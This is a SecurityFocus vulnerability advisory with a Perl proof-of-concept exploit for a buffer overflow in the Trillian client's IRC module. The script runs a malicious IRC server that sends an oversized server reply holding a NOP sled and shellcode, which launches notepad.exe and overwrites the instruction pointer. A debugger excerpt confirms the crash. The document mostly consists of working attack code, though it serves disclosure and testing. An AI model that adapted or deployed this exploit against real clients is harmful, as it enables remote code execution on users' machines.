source: http://www.securityfocus.com/bid/5373/info

A buffer overflow condition has been reported in the Trillian IRC module. The condition is due to insecure handling of data extracted from server responses. An attacker in control of a malicious server may exploit vulnerable clients who have connected. 

#!/usr/local/bin/perl
#---------------------sicillian.pl------------------------
#- Proof of concept exploit for trillians irc module.
#- Tested on trillian 0.73 but i suspect all version
#- prior maybe exploited as well.
#-
#- John C. Hennessy (Information security analyst)
#------------------------------------------------------

use Socket;

$|=1;

        #egg written by UNYUN (http://www.shadowpenguin.org/)
$egg = "\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2";
$egg .= "\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7";
$egg .= "\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C";
$egg .= "\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB";
$egg .= "\xFD\xE8\xD4\xFF\xFF\xFF";
$egg .= "notepad.exe";

$buf = "\x90" x 174;
$buf .= $egg;
$buf .= "\x41\x41\x41\x41";


my $host = inet_aton("127.0.0.1");
my $proto = getprotobyname("tcp");
my $port = 6667;

my $add_port = sockaddr_in($port,$host);

my $ser_sock = socket(SOCKET,PF_INET,SOCK_STREAM,$proto) or die "Cannot open
Socket: $!";

bind(SOCKET,$add_port) or die "\nCould\'t bind to port $port : $!\n ";

my $connection = listen(SOCKET,5) or die "Could't listen on $port: $! \n";

while(accept(CLIENT,SOCKET)){
print CLIENT "PING :1986115026\r\n001 :irc.random.org trillian :$buf\r\n";
}
close(SOCKET);


##########Snippet from debugger##########
# Access violation - code c0000005 (first chance)
# eax=00000000 ebx=022738c8 ecx=100446d0 edx=00000901 esi=02274e60
edi=022738c8
# eip=41414141 esp=0012ca58 ebp=01283718 iopl=0         nv up ei pl nz na po
nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000 efl=00010206
# 41414141 ??               ???
#####################################
